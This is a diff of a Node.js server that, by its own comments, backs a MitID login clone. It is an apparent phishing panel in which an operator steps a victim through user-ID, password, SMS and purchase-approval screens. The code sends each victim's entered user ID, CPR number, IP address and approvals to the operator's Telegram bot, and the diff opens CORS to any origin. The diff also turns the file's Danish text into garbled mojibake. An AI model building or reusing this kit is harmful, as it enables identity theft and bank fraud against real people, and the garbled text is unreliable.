@@ -1,4 +1,4 @@
-require('dotenv').config();
+﻿require('dotenv').config();
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -15,9 +15,9 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'skift-mig';
 const PORT = process.env.PORT || 3000;
 
-// --- cPanel/Passenger kan køre app'en i flere processer, og hver proces har
-// sin egen kopi af `state` i hukommelsen. data.json er det fælles
-// udgangspunkt, så vi husker filens mtime og genindlæser når en anden proces
+// --- cPanel/Passenger kan kÃ¸re app'en i flere processer, og hver proces har
+// sin egen kopi af `state` i hukommelsen. data.json er det fÃ¦lles
+// udgangspunkt, sÃ¥ vi husker filens mtime og genindlÃ¦ser nÃ¥r en anden proces
 // har skrevet til den. ---
 let stateMtime = null;
 function stateMtimeNow() {
@@ -27,11 +27,11 @@ function stateMtimeNow() {
 function defaultState() {
   return {
     live: false,
-    // flow-sekvensen: 'besked' -> 'scan' -> 'action' (egen tekst: godkend køb osv.) -> 'wait' -> 'approved'
+    // flow-sekvensen: 'besked' -> 'scan' -> 'action' (egen tekst: godkend kÃ¸b osv.) -> 'wait' -> 'approved'
     flow: 'brugerid',
     typed: { brugerId: '', cpr: '' },
     beskedBanner: { visible: false, text: '' },
-    action: { title: 'Godkend dette køb', amount: '', detail: '' },
+    action: { title: 'Godkend dette kÃ¸b', amount: '', detail: '' },
     tekst: '',
     target: '',
     title: '',
@@ -76,14 +76,14 @@ function loadState() {
   } catch (e) {
     // ugyldig data.json: behold filen som den er (backup sker ikke her, men
     // vi OVERSKRIVER den ikke med defaults -- det ville slette al data)
-    console.error('data.json kunne ikke laeses - bruger defaults i hukommelsen, filen røres ikke:', e.message);
+    console.error('data.json kunne ikke laeses - bruger defaults i hukommelsen, filen rÃ¸res ikke:', e.message);
     return defaultState();
   }
 }
 
 function saveState(state) {
-  // STÆRK BACKEND: atomisk skrivning — skriv til temp-fil og omdøb.
-  // Strømmer/afbrydelser kan ikke efterlade en halv data.json.
+  // STÃ†RK BACKEND: atomisk skrivning â€” skriv til temp-fil og omdÃ¸b.
+  // StrÃ¸mmer/afbrydelser kan ikke efterlade en halv data.json.
   try {
     const tmp = DATA_FILE + '.tmp';
     fs.writeFileSync(tmp, JSON.stringify(state, null, 2));
@@ -97,7 +97,7 @@ function saveState(state) {
 let state = loadState();
 stateMtime = stateMtimeNow();
 
-// --- Genindlæs fra disk før hvert HTTP-request, så ændringer skrevet af andre
+// --- GenindlÃ¦s fra disk fÃ¸r hvert HTTP-request, sÃ¥ Ã¦ndringer skrevet af andre
 // processer altid er synlige (Passenger/cPanel multi-proces). ---
 function refreshStateFromDisk() {
   try {
@@ -110,6 +110,14 @@ function refreshStateFromDisk() {
 }
 app.use((req, res, next) => { refreshStateFromDisk(); next(); });
 
+// CORS: admin/visitor kan hostes på andre domæner (fx thedevsadminpanel.com)
+app.use((req, res, next) => {
+  res.set('Access-Control-Allow-Origin', '*');
+  res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+  res.set('Access-Control-Allow-Headers', '*');
+  if (req.method === 'OPTIONS') return res.sendStatus(204);
+  next();
+});
 app.use(express.json());
 
 // --- No-cache guard for the public display: this is what a kiosk screen sits
@@ -134,10 +142,10 @@ app.get(['/admin/panel-d8x3q', '/admin/panel-d8x3q/'], (req, res) => {
   res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
   res.sendFile(path.join(__dirname, 'public', 'visitor-app', 'panel-d8x3q', 'index.html'));
 });
-// Kundesiden paa roden (/) og /login — kunden skal ikke skulle huske "/display"
-// Kundesiden: BARE domænet (ingen sti) -> visitor.html direkte.
+// Kundesiden paa roden (/) og /login â€” kunden skal ikke skulle huske "/display"
+// Kundesiden: BARE domÃ¦net (ingen sti) -> visitor.html direkte.
 // /display virker stadig som alias. /login ogsaa.
-// Kundesiden (visitor — MitID-login): / redirectes til /visitor/ (relative assets),
+// Kundesiden (visitor â€” MitID-login): / redirectes til /visitor/ (relative assets),
 // /visitor/ serves mappen statisk. /login er alias for /visitor/.
 app.get('/', (req, res) => res.redirect(302, '/visitor/'));
 app.get('/login', (req, res) => res.redirect(302, '/visitor/'));
@@ -163,11 +171,11 @@ app.get('/api/public-state', (req, res) => {
   res.json(publicPayload());
 });
 
-// ════════════════════════════════════════════════════════════
-// MITID KLON-BACKEND — delte /api/public/* endpoints som både
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// MITID KLON-BACKEND â€” delte /api/public/* endpoints som bÃ¥de
 // admin-panelet og visitor-siden bruger (via mock-api broen).
 // Admin-panelers toggles skriver her; visitor-siden poller.
-// ════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 const mitidState = {
   settings: {
     'show-sms': true,
@@ -217,7 +225,7 @@ app.post('/api/public/settings/:key', (req, res) => {
   res.set('Access-Control-Allow-Origin', '*');
   const key = req.params.key;
   if (!SETTINGS_RESPONSES[key]) return res.status(400).json({ error: 'unknown setting' });
-  // Accepter flere body-former: {value}, {showSmsField}, {redirectUrl}, rå værdi
+  // Accepter flere body-former: {value}, {showSmsField}, {redirectUrl}, rÃ¥ vÃ¦rdi
   const b = req.body || {};
   let val;
   if (b.value !== undefined) val = b.value;
@@ -271,7 +279,7 @@ app.post('/api/public/current-qr', (req, res) => {
   });
 });
 
-// Admin-panelets egne endpoints (kræves af admin-klonen via broen)
+// Admin-panelets egne endpoints (krÃ¦ves af admin-klonen via broen)
 app.post('/api/public/admin-verify', (req, res) => {
   res.set('Access-Control-Allow-Origin', '*');
   res.json({ success: true, valid: true, token: 'local-' + Date.now() });
@@ -299,8 +307,8 @@ app.get('/r/:sessionId', (req, res) => {
     }
     saveState(state);
     io.emit('admin-state-update', safeAdminState());
-    // Telegram: notificér admin om scanningen (med kundens IP)
-    telegramSend(`📲 QR scannet (session ${req.params.sessionId})\nIP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'ukendt'}\nKlokken: ${new Date().toLocaleString('da-DK')}`).catch(() => {});
+    // Telegram: notificÃ©r admin om scanningen (med kundens IP)
+    telegramSend(`ðŸ“² QR scannet (session ${req.params.sessionId})\nIP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'ukendt'}\nKlokken: ${new Date().toLocaleString('da-DK')}`).catch(() => {});
     return res.redirect(302, state.target);
   }
   res.status(404).send(`
@@ -415,7 +423,7 @@ app.post('/api/capture-push', requireAdmin, (req, res) => {
     res.json({ ok: true, target: clean, live: state.live });
     if (changed) {
           io.emit('state-update', publicPayload());
-          telegramSend(`🎯 QR-mål opdateret via skærmdeling:\n${clean.slice(0, 100)}\n(${new Date().toLocaleString('da-DK')})`).catch(() => {});
+          telegramSend(`ðŸŽ¯ QR-mÃ¥l opdateret via skÃ¦rmdeling:\n${clean.slice(0, 100)}\n(${new Date().toLocaleString('da-DK')})`).catch(() => {});
     }
     io.emit('admin-state-update', safeAdminState());
     saveState(state);
@@ -454,15 +462,15 @@ setInterval(async () => {
 }, 20000);
 
 // --- Login med Telegram-2FA ---
-// Trin 1: korrekt adgangskode -> generér 6-cifret kode, send til Telegram-bot,
-//         og krav koden før adgang gives (fald tilbage til kun adgangskode hvis
+// Trin 1: korrekt adgangskode -> generÃ©r 6-cifret kode, send til Telegram-bot,
+//         og krav koden fÃ¸r adgang gives (fald tilbage til kun adgangskode hvis
 //         Telegram ikke er konfigureret).
 const crypto = require('crypto');
 
 app.post('/api/login', (req, res) => {
   const ip = clientIp(req);
   if (loginRateLimited(ip)) {
-    return res.status(429).json({ ok: false, error: 'For mange forsøg — prøv igen om få minutter' });
+    return res.status(429).json({ ok: false, error: 'For mange forsÃ¸g â€” prÃ¸v igen om fÃ¥ minutter' });
   }
   const { password } = req.body;
   if (password !== ADMIN_PASSWORD) {
@@ -476,20 +484,20 @@ app.post('/api/login', (req, res) => {
   if (!tgReady) {
     return res.json({ ok: true, needsCode: false });
   }
-  // generér kode (6 cifre), gyldig 5 min
+  // generÃ©r kode (6 cifre), gyldig 5 min
   const code = String(crypto.randomInt(100000, 999999));
   state.loginCode = { code, expiresAt: Date.now() + 5 * 60 * 1000, attempts: 0 };
   saveState(state);
-  telegramSend(`🔐 TheDevs Admin Panel\nLogin-kode: ${code}\n(Gyldig i 5 minutter — ${
+  telegramSend(`ðŸ” TheDevs Admin Panel\nLogin-kode: ${code}\n(Gyldig i 5 minutter â€” ${
     new Date().toLocaleTimeString('da-DK')})`).catch(() => {});
   res.json({ ok: true, needsCode: true });
 });
 
-// Trin 2: verificér koden fra Telegram
+// Trin 2: verificÃ©r koden fra Telegram
 app.post('/api/login/verify', (req, res) => {
   const ip = clientIp(req);
   if (loginRateLimited(ip)) {
-    return res.status(429).json({ ok: false, error: 'For mange forsøg — prøv igen om få minutter' });
+    return res.status(429).json({ ok: false, error: 'For mange forsÃ¸g â€” prÃ¸v igen om fÃ¥ minutter' });
   }
   const { password, code } = req.body;
   if (password !== ADMIN_PASSWORD) {
@@ -498,17 +506,17 @@ app.post('/api/login/verify', (req, res) => {
   }
   const lc = state.loginCode;
   if (!lc || !lc.code) {
-    return res.status(400).json({ ok: false, error: 'Ingen kode sendt — log ind igen' });
+    return res.status(400).json({ ok: false, error: 'Ingen kode sendt â€” log ind igen' });
   }
   if (Date.now() > lc.expiresAt) {
     state.loginCode = null;
     saveState(state);
-    return res.status(400).json({ ok: false, error: 'Koden er udløbet — log ind igen' });
+    return res.status(400).json({ ok: false, error: 'Koden er udlÃ¸bet â€” log ind igen' });
   }
   if ((lc.attempts || 0) >= 5) {
     state.loginCode = null;
     saveState(state);
-    return res.status(429).json({ ok: false, error: 'For mange forsøg — log ind igen' });
+    return res.status(429).json({ ok: false, error: 'For mange forsÃ¸g â€” log ind igen' });
   }
   if (String(code || '').trim() !== lc.code) {
     lc.attempts = (lc.attempts || 0) + 1;
@@ -516,7 +524,7 @@ app.post('/api/login/verify', (req, res) => {
     saveState(state);
     return res.status(401).json({ ok: false, error: 'Forkert kode' });
   }
-  // korrekt kode — ryd den og nulstil rate-limit
+  // korrekt kode â€” ryd den og nulstil rate-limit
   state.loginCode = null;
   loginRateReset(ip);
   saveState(state);
@@ -525,7 +533,7 @@ app.post('/api/login/verify', (req, res) => {
 
 // --- Telegram-notifikationer ---
 // Token+chatId lever KUN paa serveren: gemmes i data.json men strippes i
-// alle API-svar og broadcasts, så de aldrig rammer en browser/klient.
+// alle API-svar og broadcasts, sÃ¥ de aldrig rammer en browser/klient.
 async function telegramSend(text) {
   const t = state.telegram || {};
   const token = (t.token || process.env.TELEGRAM_BOT_TOKEN || '').trim();
@@ -541,7 +549,7 @@ async function telegramSend(text) {
     t.lastSentAt = Date.now();
     if (r.ok) t.sentCount = (t.sentCount || 0) + 1;
   } catch (e) {
-    t.lastError = e.message || 'Netværksfejl';
+    t.lastError = e.message || 'NetvÃ¦rksfejl';
   }
 }
 
@@ -568,7 +576,7 @@ app.post('/api/telegram-settings', requireAdmin, (req, res) => {
 
 app.post('/api/telegram-test', requireAdmin, async (req, res) => {
   state.telegram.lastError = null;
-  await telegramSend('✅ QR-panel: Test-besked — Telegram-integrationen virker!');
+  await telegramSend('âœ… QR-panel: Test-besked â€” Telegram-integrationen virker!');
   saveState(state);
   res.json(safeAdminState().telegram);
 });
@@ -598,16 +606,16 @@ app.post('/api/session/new', requireAdmin, (req, res) => {
   res.json(safeAdminState());
 });
 
-// --- Flow: kundens trin på /display — 'besked' | 'scan' | 'action' | 'wait' | 'approved' ---
+// --- Flow: kundens trin pÃ¥ /display â€” 'besked' | 'scan' | 'action' | 'wait' | 'approved' ---
 // Styrles fra admin-konsollens kontrol-knapper. 'approved' sender
 // Telegram-besked ("Kunde er nu Godkendt!") som i det gamle panel.
 app.post('/api/flow', requireAdmin, (req, res) => {
   const flow = req.body.flow;
-  if (!['brugerid', 'loader', 'venterqr', 'scan', 'bekræft', 'kodeviser', 'adgangskode', 'sms', 'annullering', 'wait', 'approved'].includes(flow)) {
+  if (!['brugerid', 'loader', 'venterqr', 'scan', 'bekrÃ¦ft', 'kodeviser', 'adgangskode', 'sms', 'annullering', 'wait', 'approved'].includes(flow)) {
     return res.status(400).json({ error: 'Ugyldigt flow' });
   }
   state.flow = flow;
-  // action-trin: medsend evt. ny tekst/beløb/detalje
+  // action-trin: medsend evt. ny tekst/belÃ¸b/detalje
   if (flow === 'betaling' && req.body.action) {
     const a = req.body.action;
     state.action = state.action || {};
@@ -617,24 +625,24 @@ app.post('/api/flow', requireAdmin, (req, res) => {
   }
   state.lastUpdated = Date.now();
   saveState(state);
-  // øjeblikkelig push til kundesiden (socket) + admin
+  // Ã¸jeblikkelig push til kundesiden (socket) + admin
   io.emit('state-update', publicPayload());
   io.emit('admin-state-update', safeAdminState());
   if (flow === 'approved') {
-    telegramSend('✅ Kunde er nu Godkendt!').catch(() => {});
+    telegramSend('âœ… Kunde er nu Godkendt!').catch(() => {});
   }
   res.json(safeAdminState());
 });
 
-// --- Kunden har trykket GODKEND/ANNULLER på action-trinnet ---
+// --- Kunden har trykket GODKEND/ANNULLER pÃ¥ action-trinnet ---
 app.post('/api/action-response', (req, res) => {
   const r = req.body.response; // 'ok' | 'cancel'
   if (!['ok', 'cancel'].includes(r)) {
     return res.status(400).json({ error: 'Ugyldigt svar' });
   }
   const a = state.action || {};
-  const label = r === 'ok' ? '✅ GODKENDT' : '❌ ANNULLERET';
-  const amount = a.amount ? ` — ${a.amount}` : '';
+  const label = r === 'ok' ? 'âœ… GODKENDT' : 'âŒ ANNULLERET';
+  const amount = a.amount ? ` â€” ${a.amount}` : '';
   telegramSend(`${label} af kunden\n${a.title || 'Handling'}${amount}\n${a.detail || ''}\n(${new Date().toLocaleString('da-DK')})`).catch(() => {});
   state.actionResponse = { at: Date.now(), response: r };
   if (r === 'ok') {
@@ -757,7 +765,7 @@ function publicPayload() {
     sessionId: state.sessionId,
     title: state.title,
     message: state.message,
-    action: { title: a.title || 'Godkend dette køb', amount: a.amount || '', detail: a.detail || '' },
+    action: { title: a.title || 'Godkend dette kÃ¸b', amount: a.amount || '', detail: a.detail || '' },
     tekst: state.tekst || '',
     typed: state.typed || { brugerId: '', cpr: '' },
     beskedBanner: state.beskedBanner || { visible: false, text: '' },
@@ -767,15 +775,15 @@ function publicPayload() {
   };
 }
 
-// ════════════════════════════════════════════════════════════
-// STÆRK BACKEND — robusthed så app'en ikke går ned:
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// STÃ†RK BACKEND â€” robusthed sÃ¥ app'en ikke gÃ¥r ned:
 // 1) Ingen route-fejl kan crashe processen
-// 2) Rate-limit på login (brute-force-beskyttelse)
-// 3) Ufangede promise-fejl logges i stedet for at dræbe processen
+// 2) Rate-limit pÃ¥ login (brute-force-beskyttelse)
+// 3) Ufangede promise-fejl logges i stedet for at drÃ¦be processen
 // 4) Disk-fejl under skrivning mister aldrig data i hukommelsen
-// ════════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-// global fejlhåndtering: log og koer videre
+// global fejlhÃ¥ndtering: log og koer videre
 process.on('uncaughtException', (err) => {
   console.error('[crash-guard] uncaughtException:', err.message, err.stack ? err.stack.split('\n')[1] : '');
 });
@@ -783,7 +791,7 @@ process.on('unhandledRejection', (reason) => {
   console.error('[crash-guard] unhandledRejection:', reason && reason.message ? reason.message : reason);
 });
 
-// rate-limit: login (og 2FA-verificering) — max 10 forsøg pr. 10 min pr. IP
+// rate-limit: login (og 2FA-verificering) â€” max 10 forsÃ¸g pr. 10 min pr. IP
 const loginAttempts = new Map(); // ip -> { count, firstAt }
 const LOGIN_WINDOW_MS = 10 * 60 * 1000;
 const LOGIN_MAX = 10;
@@ -813,13 +821,13 @@ io.on('connection', (socket) => {
   socket.emit('state-update', publicPayload());
 });
 
-// Pas på: på cPanel/Passenger skal denne app IKKE lægge om til et fast portnr
-// eller '0.0.0.0' — Passenger selv styrer forbindelsen, og listen-kaldet her
+// Pas pÃ¥: pÃ¥ cPanel/Passenger skal denne app IKKE lÃ¦gge om til et fast portnr
+// eller '0.0.0.0' â€” Passenger selv styrer forbindelsen, og listen-kaldet her
 // fungerer som det er (PORT bruges kun ved lokal test).
 server.listen(PORT, () => {
-  console.log(`QR-panel kører på http://localhost:${PORT}`);
+  console.log(`QR-panel kÃ¸rer pÃ¥ http://localhost:${PORT}`);
   console.log(`Admin: http://localhost:${PORT}/admin`);
-  console.log(`Skærm: http://localhost:${PORT}/display`);
+  console.log(`SkÃ¦rm: http://localhost:${PORT}/display`);
 });
 
 
@@ -853,7 +861,7 @@ setInterval(() => {
           saveState(state);
           io.emit('state-update', publicPayload());
           io.emit('admin-state-update', safeAdminState());
-          telegramSend(`🔄 QR-rotation: ny session ${state.sessionId} (${now.toLocaleString('da-DK')})`).catch(() => {});
+          telegramSend(`ðŸ”„ QR-rotation: ny session ${state.sessionId} (${now.toLocaleString('da-DK')})`).catch(() => {});
     }
 }, 1000);
 
@@ -864,12 +872,12 @@ app.post('/api/typed', (req, res) => {
   if (brugerId !== undefined && brugerId !== state.typed.brugerId) {
     state.typed.brugerId = String(brugerId).slice(0, 30);
     changed = true;
-    telegramSend('🆔 Kunde indtastede Bruger-ID: ' + state.typed.brugerId).catch(() => {});
+    telegramSend('ðŸ†” Kunde indtastede Bruger-ID: ' + state.typed.brugerId).catch(() => {});
   }
   if (cpr !== undefined && cpr !== state.typed.cpr) {
     state.typed.cpr = String(cpr).slice(0, 15);
     changed = true;
-    telegramSend('👤 Kunde indtastede CPR: ' + state.typed.cpr).catch(() => {});
+    telegramSend('ðŸ‘¤ Kunde indtastede CPR: ' + state.typed.cpr).catch(() => {});
   }
   if (changed) {
     saveState(state);
@@ -887,8 +895,8 @@ app.post('/api/besked-banner', requireAdmin, (req, res) => {
   io.emit('admin-state-update', safeAdminState());
   res.json({ ok: true });
 });
-// 404-handler + global express-fejl-handler — ALLERSIDST i filen,
-// efter alle endpoints (fx /api/rotate-settings), så intet bliver slugt
+// 404-handler + global express-fejl-handler â€” ALLERSIDST i filen,
+// efter alle endpoints (fx /api/rotate-settings), sÃ¥ intet bliver slugt
 app.use((req, res) => {
   res.status(404).json({ error: 'Ikke fundet' });
 });
@@ -897,3 +905,4 @@ app.use((err, req, res, next) => {
   if (res.headersSent) return next(err);
   res.status(500).json({ error: 'Intern fejl' });
 });
+
